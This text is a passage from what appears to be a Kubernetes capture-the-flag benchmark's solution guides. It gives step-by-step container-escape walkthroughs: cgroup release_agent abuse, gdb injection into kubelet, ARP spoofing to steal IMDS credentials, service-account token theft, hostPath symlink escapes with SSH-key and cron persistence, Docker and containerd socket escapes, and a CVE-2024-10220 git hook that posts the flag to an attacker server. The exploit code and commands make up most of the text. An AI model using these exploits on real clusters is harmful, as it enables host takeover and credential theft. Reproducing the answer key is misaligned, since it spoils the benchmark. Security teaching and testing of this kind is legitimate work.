## Since /host-flag is a hostPath mount, the host can see it
cp /tmp/release_script.sh /host-flag/release_script.sh
chmod +x /host-flag/release_script.sh
```

#### Step 5: Set release_agent
```bash
## Set the release_agent to point to our script
## The path must be from the host's perspective
echo "/host-flag/release_script.sh" > /sys/fs/cgroup/memory/release_agent
## Expected: no output (if successful)

## Verify
cat /sys/fs/cgroup/memory/release_agent
## Expected: /host-flag/release_script.sh
```

#### Step 6: Trigger the Release
To trigger the release_agent, the last process in the exploit cgroup must exit:

```bash
## Add the current shell to the exploit cgroup
echo $$ > /sys/fs/cgroup/memory/exploit/cgroup.procs

## Exit the shell to trigger release_agent
exit
## Now the exploit cgroup is empty -> release_agent runs on the host
```

#### Step 7: Read the Flag
After exiting and re-entering the pod:

```bash
## Re-exec into the pod
kubectl exec -it capsys-pod -- sh

## Check if the flag was captured
cat /host-flag/flag_captured.txt 2>/dev/null || cat /tmp/flag_captured.txt 2>/dev/null

## Or check on the KIND node directly
docker exec cve-k8s-14-capsys-control-plane cat /tmp/flag_captured.txt 2>/dev/null
## Expected: flag{k8s-14-*}
```

#### Step 8: Alternative -- One-shot Exploit
```bash
## Complete exploit in one go
kubectl exec capsys-pod -- sh -c '
mkdir -p /sys/fs/cgroup/memory/exploit
echo 1 > /sys/fs/cgroup/memory/exploit/notify_on_release
echo "#!/bin/sh" > /host-flag/payload.sh
echo "cat /host-flag/flag.txt > /tmp/flag_captured.txt" >> /host-flag/payload.sh
chmod +x /host-flag/payload.sh
echo "/host-flag/payload.sh" > /sys/fs/cgroup/memory/release_agent
echo $$ > /sys/fs/cgroup/memory/exploit/cgroup.procs
'
## Then exit the pod to trigger
```

#### Step 9: Capture Flag
- Flag format: `flag{k8s-14-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node
- Expected output: `flag{k8s-14-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the scenario is deployed and running
kubectl get pod capsys-pod
## Expected: NAME         READY   STATUS    RESTARTS   AGE
##           capsys-pod   1/1     Running   0          ...

## Verify SYS_ADMIN capability
kubectl exec capsys-pod -- cat /proc/self/status | grep CapEff

## Verify cgroup mount
kubectl exec capsys-pod -- mount | grep cgroup

## Verify flag directory on the node
docker exec cve-k8s-14-capsys-control-plane ls /host-flag/
## Expected: flag.txt
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-19-ptrace-inject-exploitation.md -->

## K8S-19: CAP_SYS_PTRACE Host Process Injection

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CAP_SYS_PTRACE + CAP_SYS_ADMIN abuse, hostPID: true |
| Difficulty | L3 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-19-ptrace |
| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |

### Attack Path Summary
1. Pod runs with `CAP_SYS_PTRACE` and `CAP_SYS_ADMIN` capabilities, `hostPID: true`
2. Ubuntu 22.04 image with `gdb` installed
3. Identify `kubelet` process PID on the host (visible via hostPID)
4. Attach `gdb` to the kubelet process
5. Use `gdb` to call `system()` inside the kubelet process, writing the flag to a readable file
6. Read the flag from the temporary file

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-19-ptrace`
- Pod name: `ptrace-pod`
- Tools inside pod: `gdb` (pre-installed), `bash`, `ps`, `cat`

### Step-by-Step Exploitation

#### Step 1: Initial Access
Exec into the pod with elevated capabilities:

```bash
kubectl exec -it ptrace-pod -- bash
```

Verify capabilities and hostPID access:

```bash
## Check that we can see host processes
ps aux | head -20
## Expected: shows ALL processes on the KIND node, not just container processes
## Key processes to identify: kubelet, containerd, kube-apiserver

## Verify capabilities
cat /proc/self/status | grep CapEff
## Expected: hex value (will include CAP_SYS_PTRACE and CAP_SYS_ADMIN bits)

## Decode capabilities
cat /proc/self/status | grep CapEff | awk '{print $2}' | while read cap; do
    capsh --decode=$cap
done
## Verify CAP_SYS_PTRACE and CAP_SYS_ADMIN are present
```

#### Step 2: Find the Kubelet Process
```bash
## Find the kubelet PID
ps aux | grep kubelet | grep -v grep
## Expected:
## root      <PID>  ... /usr/bin/kubelet ...

## Note the PID (typically the first number in the output)
KUBELET_PID=$(ps aux | grep '[k]ubelet' | awk '{print $2}')
echo "Kubelet PID: $KUBELET_PID"
```

#### Step 3: Verify gdb is Available
```bash
which gdb
## Expected: /usr/bin/gdb

## If gdb is not installed:
apt-get update && apt-get install -y gdb
```

#### Step 4: Inject Command via gdb
Use `gdb` to attach to the kubelet process and call `system()`:

```bash
## Approach 1: Direct attach and call (may fail if no libc symbols)
gdb -p $KUBELET_PID \
    -batch \
    -ex "call (int)system(\"cat /host-flag/flag.txt > /tmp/flag_out.txt\")"

## Approach 2: Interactive gdb session (more reliable)
gdb -p $KUBELET_PID
```

Inside the interactive gdb session:

```
(gdb) call (int)system("cat /host-flag/flag.txt > /tmp/flag_out.txt")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1"

Program received signal SIGSTOP, Stopped (signal).
[Switching to Thread <PID>]
<... output ...>
$1 = 0

(gdb) quit
```

#### Step 5: Read the Flag
```bash
cat /tmp/flag_out.txt
## Expected: flag{k8s-19-*}
```

#### Step 6: Alternative -- Shell Reverse via system()
For a more interactive foothold on the host:

```bash
## Write a reverse shell script first
echo '#!/bin/bash
cat /host-flag/flag.txt > /tmp/flag_out.txt' > /tmp/escape.sh
chmod +x /tmp/escape.sh

## Inject execution
gdb -p $KUBELET_PID -batch -ex "call (int)system(\"bash /tmp/escape.sh\")"
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-19-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node
- Read method: inject `system()` call via gdb into kubelet process to write flag to `/tmp/flag_out.txt`
- Expected output: `flag{k8s-19-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the scenario is deployed and running
kubectl get pod ptrace-pod
## Expected: NAME         READY   STATUS    RESTARTS   AGE
##           ptrace-pod   1/1     Running   0          ...

## Verify capabilities
kubectl exec ptrace-pod -- cat /proc/self/status | grep CapEff

## Verify hostPID access (should see kubelet and other host processes)
kubectl exec ptrace-pod -- ps aux | grep kubelet

## Verify gdb is available
kubectl exec ptrace-pod -- which gdb
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/cloud-02-cap-netraw-exploitation.md -->

## CLOUD-02: Container Escape via CAP_NET_RAW → Metadata MITM

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (CAP_NET_RAW + ARP spoofing) |
| Difficulty | L3 |
| Type | k8s |
| Path | docker/cloud/cap-netraw-metadata |

### Attack Path Summary
CAP_NET_RAW capability → ARP spoofing → intercept victim→metadata traffic → steal IMDS credentials

### Prerequisites
#### Knowledge
- Linux capabilities (CAP_NET_RAW) and network stack manipulation
- ARP spoofing and man-in-the-middle attack techniques
- EC2 Instance Metadata Service (IMDS) protocol

#### Tools
- arpspoof / ettercap: ARP spoofing tools
- tcpdump / wireshark: Network traffic capture and analysis

### Step-by-Step Exploitation
#### Step 1: Deploy Attacker Pod with CAP_NET_RAW
**Flag:** `flag{cloud-02-step1-netraw}`

```bash
kubectl get pods
kubectl exec -it attacker -- sh
```

#### Step 2: ARP Spoof + Metadata Interception
Use CAP_NET_RAW to redirect victim pod traffic through attacker, capturing IMDS credentials.

```bash
arpspoof -i eth0 -t <victim_ip> <gateway_ip>
tcpdump -i eth0 -A port 5000
```

#### Step 3: Use Stolen Credentials
Use captured IMDS credentials to access protected cloud resources.

### Flag Location
- Flag: Environment variable in victim pod

### Verification Commands
```bash
kubectl exec attacker -- cat /proc/1/status | grep Cap
kubectl exec victim -- env | grep FLAG
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/cloud-03-sa-cross-ns-exploitation.md -->

## CLOUD-03: K8s SA Token → Cross-Namespace Access

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (overly permissive RBAC) |
| Difficulty | L3 |
| Type | k8s |
| Path | docker/cloud/sa-cross-namespace |

### Attack Path Summary
Compromise pod in tenant-a → extract broad ServiceAccount token → use k8s API to access tenant-b resources → read cross-namespace flag

### Prerequisites
#### Knowledge
- Kubernetes RBAC: ServiceAccounts, ClusterRoles, ClusterRoleBindings
- K8s API authentication with bearer tokens
- Namespace isolation and cross-namespace access patterns

#### Tools
- kubectl: Kubernetes cluster interaction
- curl: HTTP requests to k8s API

### Step-by-Step Exploitation
#### Step 1: Extract SA Token from Attacker Pod
**Flag:** `flag{cloud-03-step1-sa}`

```bash
kubectl exec -it -n tenant-a attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

#### Step 2: Use SA Token to Access tenant-b Resources
Use the broad SA token to list secrets and exec into pods in tenant-b.

```bash
TOKEN=$(kubectl exec -n tenant-a attacker -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl get secrets -n tenant-b --token=$TOKEN
kubectl get secret target-flag -n tenant-b -o jsonpath='{.data.flag}' --token=$TOKEN | base64 -d
```

### Flag Location
- Flag: Secret `target-flag` in namespace `tenant-b`

### Verification Commands
```bash
kubectl get clusterrolebinding broad-binding -o yaml
kubectl auth can-i get secrets -n tenant-b --as=system:serviceaccount:tenant-a:broad-sa
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/cloud-19-multitenant-exploitation.md -->

## CLOUD-19: Multi-Tenant K8s: Container Escape → Cross-Tenant Access

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (privileged container + hostPID escape) |
| Difficulty | L3 |
| Type | k8s |
| Path | docker/cloud/multi-tenant-k8s |

### Attack Path Summary
Deploy privileged pod in tenant-a → nsenter to host → discover bridge SA token → kubectl exec into tenant-b pod → read cross-tenant flag

### Prerequisites
#### Knowledge
- Container escape techniques (privileged mode, hostPID, nsenter)
- Kubernetes node-level ServiceAccount tokens (bridge SA)
- Multi-tenant K8s architecture (shared control plane)

#### Tools
- nsenter: Enter host namespaces from privileged container
- kubectl: K8s API interaction using bridge ServiceAccount token

### Step-by-Step Exploitation
#### Step 1: Escape Privileged Container to Host
```bash
kubectl exec -it -n tenant-a attacker -- sh
nsenter --target 1 --mount --uts --ipc --net --pid -- sh
```

#### Step 2: Discover Bridge SA Token
On the host node, locate the bridge ServiceAccount token used for cross-tenant k8s API access.

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

#### Step 3: Cross-Tenant Pod Access
Use the bridge SA token to exec into the target pod in tenant-b.

```bash
kubectl exec -it -n tenant-b target -- env | grep FLAG
```

### Flag Location
- Flag: Environment variable in tenant-b target pod

### Verification Commands
```bash
kubectl get pods -n tenant-a
kubectl get pods -n tenant-b
kubectl exec -n tenant-a attacker -- cat /proc/1/status | grep -E 'Seccomp|Cap'
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-12-hostpath-escape-exploitation.md -->

## K8S-12: hostPath Writable Mount Escape

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- writable hostPath volume + symlink |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-12-hostpath |
| Flag Location | `/host-flag/flag.txt` on KIND node (or host) |

### Attack Path Summary
1. Pod `hostpath-pod` mounts `/var/log` from the host as a writable hostPath volume
2. The pod also mounts `/host-flag` as a hostPath volume (containing the flag)
3. Create a symlink in `/var/log` pointing to the host's `/host-flag` directory
4. Read the flag through the symlink -- or use the writable mount to write SSH keys, cron jobs, etc.
5. Alternatively, the symlink trick can redirect writes to escape to the host filesystem

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-12-hostpath`
- Pod name: `hostpath-pod` (alpine image)
- Tools inside pod: `ln`, `cat`, `ls`

### Step-by-Step Exploitation

#### Step 1: Initial Access
Exec into the pod with hostPath volumes:

```bash
kubectl exec -it hostpath-pod -- sh
```

#### Step 2: Verify Mount Access
```bash
## Check the writable mount
ls -la /host-log/
## Expected: contents of /var/log from the KIND node

## Check the flag mount
ls -la /host-flag/
## Expected: flag.txt

## Try to read the flag directly
cat /host-flag/flag.txt
## Expected: flag{k8s-12-*} (if mounted correctly)
```

#### Step 3: Symlink Attack
The core exploit: create a symlink from the writable volume to a protected host path:

```bash
## Create a symlink in the writable /var/log pointing to /host-flag
ln -sf /host-flag /host-log/flag-link

## Read the flag through the symlink
cat /host-log/flag-link/flag.txt
## Expected: flag{k8s-12-*}
```

#### Step 4: Host-Level Persistence via Writable Mount
Use the writable `/var/log` mount to write files to the host:

```bash
## Write an SSH authorized key to the host
mkdir -p /host-log/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E..." > /host-log/.ssh/authorized_keys 2>/dev/null || true

## Write a cron job
echo "* * * * * root cat /host-flag/flag.txt > /tmp/flag_out" > /tmp/cron_payload
cp /tmp/cron_payload /host-log/cron.d/escape 2>/dev/null || true

## Write a systemd service that reads the flag
cat > /host-log/systemd/system/flag-reader.service << 'EOF'
[Unit]
Description=Flag Reader
[Service]
Type=oneshot
ExecStart=/bin/cat /host-flag/flag.txt
[Install]
WantedBy=multi-user.target
EOF
```

#### Step 5: Alternative -- Exploit Log Rotation / Write Race
If a log rotation script or other process on the host writes to `/var/log`, create a symlink race:

```bash
## Continuously recreate symlinks to race against log writes
while true; do
    # If kubelet writes a log file with wrong permissions, redirect it
    ln -sf /etc/shadow /host-log/shadow 2>/dev/null
    ln -sf /host-flag/flag.txt /host-log/flag-read 2>/dev/null
    sleep 0.1
done &

## Wait for a process to write to /var/log through our redirected path
```

#### Step 6: Verify Escalation
```bash
## Check if the symlink attack worked
cat /host-log/flag-link/flag.txt

## If the flag is readable directly:
cat /host-flag/flag.txt
```

#### Step 7: Capture Flag
- Flag format: `flag{k8s-12-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node
- Access methods:
  - Direct read: `cat /host-flag/flag.txt` (if mounted)
  - Symlink escape: `ln -sf /host-flag /host-log/flag-link && cat /host-log/flag-link/flag.txt`
- Expected output: `flag{k8s-12-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the scenario is deployed and running
kubectl get pod hostpath-pod
## Expected: NAME           READY   STATUS    RESTARTS   AGE
##           hostpath-pod   1/1     Running   0          ...

## Verify writable mount
kubectl exec hostpath-pod -- ls -la /host-log/

## Verify flag mount
kubectl exec hostpath-pod -- ls -la /host-flag/

## Quick exploit verification (single line)
kubectl exec hostpath-pod -- sh -c 'ln -sf /host-flag /host-log/flag-link 2>/dev/null; cat /host-log/flag-link/flag.txt 2>/dev/null || cat /host-flag/flag.txt'
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-16-cri-socket-exploitation.md -->

## K8S-16: CRI Socket Mount Escape

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CRI socket abuse (container runtime socket) |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-16-cri-socket |
| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |

### Attack Path Summary
1. Pod has `/run/containerd/containerd.sock` mounted via hostPath with `type: Socket`
2. Pod runs as root with `ctr` binary (containerd CLI) installed
3. Use `ctr` to list images available through the host containerd
4. Launch a **privileged** container via the host containerd socket that mounts the host filesystem
5. Read the flag from the escaped container

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-16-cri-socket`
- Pod name: `cri-escape-pod`
- Tools inside pod: `ctr` (containerd CLI), bash

### Step-by-Step Exploitation

#### Step 1: Initial Access
The pod `cri-escape-pod` is deployed with the containerd socket mounted. Verify access:

```bash
## Exec into the pod
kubectl exec -it cri-escape-pod -- /bin/bash

## Verify the CRI socket is accessible
ls -la /run/containerd/containerd.sock
## Expected: srw-rw---- 1 root root 0 ... /run/containerd/containerd.sock

## Verify ctr binary is available
which ctr
## Expected: /usr/local/bin/ctr

## Test communication with the containerd daemon
ctr --address /run/containerd/containerd.sock version
## Expected: containerd client/server version info
```

#### Step 2: Enumerate Images via Host Containerd
List images available on the host containerd:

```bash
ctr --address /run/containerd/containerd.sock images ls
```

You should see the images currently available on the host (including `cri-escape-pod:local` and any Kubernetes system images).

#### Step 3: Launch Privileged Escape Container
Run a privileged container through the host containerd that mounts the host filesystem:

```bash
ctr --address /run/containerd/containerd.sock run --rm \
    --privileged \
    --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw \
    docker.io/library/alpine:latest \
    escape \
    cat /mnt/flag.txt
```

**Explanation:**
- `--privileged` grants all capabilities to the new container (no container runtime restrictions)
- The mount bind-maps `/host-flag` from the KIND node (which contains the flag) to `/mnt` inside the new container
- `docker.io/library/alpine:latest` is the image to run (pulled if not cached)
- The command `cat /mnt/flag.txt` reads the flag

If the Alpine image is not cached, pull it first:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/alpine:latest
```

#### Step 4: Advanced Escape (Interactive Shell)
For interactive host access instead of a single command:

```bash
ctr --address /run/containerd/containerd.sock run --rm -t \
    --privileged \
    --mount type=bind,src=/,dst=/host,options=rbind:rw \
    docker.io/library/alpine:latest \
    escape \
    /bin/sh
```

From the escape shell:
```bash
cat /host/host-flag/flag.txt
## Or explore the host filesystem at /host/
```

#### Step 5: Capture Flag
- Flag format: `flag{k8s-16-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node, accessible as `/mnt/flag.txt` from the escape container (or `/host-flag/flag.txt` inside the original pod)
- Expected output: `flag{k8s-16-default}` (or custom value from `CVE_FLAG` env var)

### Verification Commands
```bash
## Verify the scenario is deployed and running
kubectl get pod cri-escape-pod
## Expected: NAME             READY   STATUS    RESTARTS   AGE
##           cri-escape-pod   1/1     Running   0          ...

## Verify CRI socket is mounted
kubectl exec cri-escape-pod -- ls -la /run/containerd/containerd.sock
## Expected: srw-rw---- 1 root root ... /run/containerd/containerd.sock

## Quick exploit verification (single line)
kubectl exec cri-escape-pod -- ctr --address /run/containerd/containerd.sock run --rm --privileged --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw docker.io/library/alpine:latest escape cat /mnt/flag.txt
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-17-docker-socket-exploitation.md -->

## K8S-17: Docker Socket Mount Escape

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | Docker socket abuse (container runtime socket) |
| Difficulty | L1 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-17-docker-sock |
| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |

### Attack Path Summary
1. Pod has `/var/run/docker.sock` mounted via hostPath (extraMounts map host Docker socket into KIND node, then hostPath into pod)
2. Pod uses `docker:cli` image (contains the Docker CLI binary)
3. Use `docker` CLI to communicate with the host's Docker daemon
4. Launch a container that mounts the host filesystem via `-v /host-flag:/mnt`
5. Read the flag from the sibling container

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-17-docker-sock`
- Pod name: `docker-escape-pod`
- Tools inside pod: `docker` CLI

### Step-by-Step Exploitation

#### Step 1: Initial Access
Exec into the pod with the Docker socket mounted:

```bash
kubectl exec -it docker-escape-pod -- sh
```

Verify the Docker socket is accessible:

```bash
ls -la /var/run/docker.sock
## Expected: srw-rw---- 1 root docker ... /var/run/docker.sock

## Test communication with the host Docker daemon
docker version
## Expected: Client and Server version info
```

#### Step 2: List Images on Host Docker
Enumerate available images:

```bash
docker images
## Expected: list of images available on the host Docker daemon
```

#### Step 3: Launch Escape Container
Run a new container through the host Docker that mounts the host filesystem:

```bash
docker run --rm \
    -v /host-flag:/mnt/flag \
    alpine:latest \
    cat /mnt/flag/flag.txt
```

**Explanation:**
- `-v /host-flag:/mnt/flag` mounts the KIND node's `/host-flag` directory (which contains `flag.txt`) into the new container at `/mnt/flag`
- `alpine:latest` is the image to run (will be pulled if not cached)
- `cat /mnt/flag/flag.txt` reads the flag file

If `alpine:latest` is not available, pull it first:

```bash
docker pull alpine:latest
```

#### Step 4: Interactive Host Access
For full interactive access to the host filesystem:

```bash
## Get an interactive shell on the host
docker run --rm -it \
    -v /:/host \
    alpine:latest \
    /bin/sh
```

From the escape shell:

```bash
cat /host/host-flag/flag.txt
## Or explore the full host filesystem under /host/
```

#### Step 5: Advanced Attacks via Docker Socket
With access to the Docker socket, you can also:

```bash
## List all running containers (including kubelet, etc.)
docker ps

## Inspect other containers
docker inspect <container-id>

## Execute commands in other containers
docker exec <container-id> cat /etc/hostname

## Access host network namespace
docker run --rm --network=host alpine:latest ip addr
```

#### Step 6: Capture Flag
- Flag format: `flag{k8s-17-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node
- Direct read: `cat /host-flag/flag.txt` from inside the pod (the flag file is mounted directly)
- Via Docker escape: `docker run --rm -v /host-flag:/mnt alpine cat /mnt/flag.txt`
- Expected output: `flag{k8s-17-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the scenario is deployed and running
kubectl get pod docker-escape-pod
## Expected: NAME                READY   STATUS    RESTARTS   AGE
##           docker-escape-pod   1/1     Running   0          ...

## Verify Docker socket is mounted
kubectl exec docker-escape-pod -- ls -la /var/run/docker.sock
## Expected: srw-rw---- 1 root docker ... /var/run/docker.sock

## Quick exploit verification (single line)
kubectl exec docker-escape-pod -- docker run --rm -v /host-flag:/mnt alpine cat /mnt/flag.txt
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-23-seccomp-bypass-exploitation.md -->

## K8S-23: hostPID ProcFS Host Filesystem Access

### Overview
| Property | Value |
|----------|-------|
| CVE | N/A (hostPID misconfiguration) |
| Difficulty | L1 |
| Type | k8s |
| Cluster Name | cve-k8s-23-seccomp-bypass |
| KIND Image | kindest/node:v1.27.3 |
| Attack Vector | hostPID:true → /proc/1/root → host filesystem access |

### Attack Path

```
Pod with hostPID:true (appears locked down: non-root, no caps)
  → Access /proc/1/root to read host filesystem
  → Read flag from /host-flag/flag.txt on node
```

### Step-by-Step Exploitation

#### Step 1: Examine Pod Security Context

```bash
kubectl get pod monitor-pod -n monitor-ns -o yaml | grep -A10 securityContext
## Note: hostPID:true, runAsUser:1000, capabilities dropped, but hostPID is dangerous!
```

#### Step 2: Access Host Filesystem via /proc

```bash
## Despite appearing locked down, hostPID gives access to host namespace
kubectl exec -n monitor-ns monitor-pod -- ls /proc/1/root/

## Read the flag on the host filesystem
kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt
## Output: flag{k8s-23-<16-hex>}
```

#### Step 3: Enumerate Host Processes

```bash
kubectl exec -n monitor-ns monitor-pod -- ps aux
kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/cmdline
```

### Flag Location
- **Primary**: `/host-flag/flag.txt` on the KIND node
- **Format**: `flag{k8s-23-<16-hex>}`

### Key Takeaway
hostPID:true is a severe security risk even without privileged mode or capabilities.
`/proc/1/root/` provides access to the full host filesystem.

### Verification
```bash
cd cve_challenges/k8s/seccomp-bypass && bash deploy.sh
kubectl exec -n monitor-ns monitor-pod -- cat /proc/1/root/host-flag/flag.txt
bash teardown.sh
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-05-gitrepo-exploitation.md -->

## K8S-05: gitRepo Volume Escape (CVE-2024-10220)

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CVE-2024-10220 -- gitRepo volume arbitrary command execution |
| Difficulty | L2 |
| Type | k8s (KIND cluster, kubernetes 1.28.12) |
| Cluster Name | cve-k8s-05-gitrepo |
| Flag Location | `/host-flags/flag.txt` on KIND node (extraMount) |

### Attack Path Summary
1. Kubernetes `gitRepo` volume type clones a git repository into a pod on creation
2. CVE-2024-10220: the `post-checkout` git hook executes during clone, before container isolation
3. The hook runs on the host (or with host-level privileges), enabling escape
4. Create a malicious git repo with a `post-checkout` hook that reads the flag

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-05-gitrepo`
- K8s 1.28.x (gitRepo volume type removed in K8s 1.29+)
- Ability to create a git repository and serve it over HTTP

### Step-by-Step Exploitation

#### Step 1: Create a Malicious Git Repository
On your attack machine (the benchmark host), create a git repo with a malicious post-checkout hook:

```bash
## Create the repository
mkdir -p /tmp/malicious-repo
cd /tmp/malicious-repo
git init

## Configure git
git config user.email "attacker@test.local"
git config user.name "Attacker"

## Create the malicious post-checkout hook
mkdir -p .git/hooks
cat > .git/hooks/post-checkout << 'HOOK'
#!/bin/bash
## This hook executes AFTER git checkout during gitRepo volume initialization
## At this point, the checkout process may have elevated privileges or host access
cat /host-flags/flag.txt > /tmp/flag_captured.txt
## OR exfiltrate the flag
curl -X POST --data-binary @/host-flags/flag.txt http://attacker-server/flag
HOOK
chmod +x .git/hooks/post-checkout

## Add and commit
echo "README" > README.md
git add .
git commit -m "Initial commit with exploit hook"
```

#### Step 2: Serve the Repository over HTTP
```bash
## Make the repo available via HTTP (bare repo is better)
cd /tmp
git clone --bare /tmp/malicious-repo /tmp/served-repo.git

## Serve with Python HTTP server
cd /tmp/served-repo.git
python3 -m http.server 9999 &
## Note the IP address: use host network or the IP of the Docker/KIND bridge
```

#### Step 3: Deploy a Pod with the Malicious gitRepo Volume
```bash
## Deploy a pod referencing the malicious git repo
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: gitrepo-exploit
spec:
  containers:
    - name: app
      image: nginx:1.24-alpine
      command: ["sleep", "3600"]
      volumeMounts:
        - name: repo
          mountPath: /repo
  volumes:
    - name: repo
      gitRepo:
        repository: "http://<HOST_IP>:9999/malicious-repo"
        revision: "master"
YAML
```

**Important**: Since this is a KIND cluster running inside Docker, the `repository` URL must point to a location reachable from the KIND node. You may need to determine the correct IP:
- On Docker for Linux: use the docker bridge IP (usually `172.17.0.1`)
- On KIND: the node can reach the host at the gateway IP

#### Step 4: Check for Flag
```bash
## If the exploit succeeded, the flag may be written to /tmp on the node
docker exec cve-k8s-05-gitrepo-control-plane cat /tmp/flag_captured.txt 2>/dev/null

## Or check the pod for any output
kubectl logs gitrepo-exploit 2>/dev/null
```

#### Step 5: The post-checkout Hook Impact
When the `gitRepo` volume is created:
1. Kubelet runs `git clone` to fetch the repo
2. The `post-checkout` hook executes during the clone
3. Due to CVE-2024-10220, the hook may execute with unexpected privileges
4. The flag at `/host-flags/flag.txt` on the host is readable from the hook context

#### Step 6: Capture Flag
- Flag format: `flag{k8s-05-*}`
- Flag location: `/host-flags/flag.txt` on the KIND node
- Expected output: `flag{k8s-05-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is running
kubectl cluster-info --context kind-cve-k8s-05-gitrepo

## Verify the flag directory is mounted
docker exec cve-k8s-05-gitrepo-control-plane ls /host-flags/
## Expected: flag.txt

## Directly verify the flag content
docker exec cve-k8s-05-gitrepo-control-plane cat /host-flags/flag.txt

## List pods
kubectl get pods
```

---

<!-- source: cve_challenges/docs/scenarios/k8s/k8s-06-rbac-secrets-exploitation.md -->

## K8S-06: RBAC Secrets Abuse

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (misconfiguration) -- overly permissive ClusterRole |
| Difficulty | L1 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-06-rbac |
| Flag Location | Secret `flag-secret` in namespace `kube-system` |

### Attack Path Summary
1. A ServiceAccount `attacker-sa` is bound to ClusterRole `secrets-reader`
2. The ClusterRole grants `get` and `list` on `secrets` across all namespaces
3. An attacker pod uses this SA to read secrets cluster-wide
4. The flag is stored in `flag-secret` in `kube-system` namespace
5. Decode the base64-encoded flag value

### Prerequisites
- kubectl access to KIND cluster `cve-k8s-06-rbac`
- Pod name: `attacker-pod` (bitnami/kubectl image)
- The attacker-pod uses `serviceAccountName: attacker-sa`

### Step-by-Step Exploitation

#### Step 1: Initial Access
Exec into the attacker pod that uses the overly-permissive ServiceAccount:

```bash
kubectl exec -it attacker-pod -- /bin/bash
```

Verify the mounted ServiceAccount token:

```bash
## Check the service account in use
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
## Expected: default

## Verify authentication works
kubectl auth whoami
## Expected: shows the attacker-sa details
```

#### Step 2: Enumerate Secrets Across Namespaces
```bash
## List all secrets in the cluster
kubectl get secrets --all-namespaces
## Expected:
## NAMESPACE      NAME                   TYPE     DATA   AGE
## default        default-token-xxxxx    kubernetes.io/service-account-token   3      ...
## kube-system    flag-secret            Opaque   1      ...
## kube-system    ...                    ...      ...    ...

## Specifically check kube-system
kubectl get secrets -n kube-system
## Expected: flag-secret and other kube-system secrets
```

#### Step 3: Examine the Flag Secret
```bash
## Describe the flag secret
kubectl describe secret flag-secret -n kube-system
## Expected:
## Name:         flag-secret
## Namespace:    kube-system
## Type:         Opaque
## Data
## ====
## flag:   XX bytes
```

#### Step 4: Extract the Flag
```bash
## Decode the flag from base64
kubectl get secret flag-secret -n kube-system \
    -o jsonpath='{.data.flag}' | base64 -d
## Expected: flag{k8s-06-*}
```

#### Step 5: Explore Further (Optional)
Verify the full extent of RBAC misconfiguration:

```bash
## Can you read secrets in any namespace?
kubectl get secrets -n default

## Can you read configmaps too?
kubectl get configmaps --all-namespaces

## Can you list pods?
kubectl get pods -n kube-system
## Note: the secrets-reader ClusterRole only grants access to "secrets"
```

#### Step 6: Capture Flag
- Flag format: `flag{k8s-06-*}`
- Flag location: Secret `flag-secret` in namespace `kube-system`
- Access requirements: `get` permission on secrets in any namespace
- Expected output: `flag{k8s-06-default}` (or custom value from `CVE_FLAG`)

### Verification Commands
```bash
## Verify the cluster is deployed
kubectl cluster-info --context kind-cve-k8s-06-rbac

## Verify the attacker pod is running
kubectl get pod attacker-pod
## Expected: Running

## Verify the flag secret exists
kubectl get secret flag-secret -n kube-system

## Quick exploit (single line)
kubectl exec attacker-pod -- kubectl get secret flag-secret -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

---

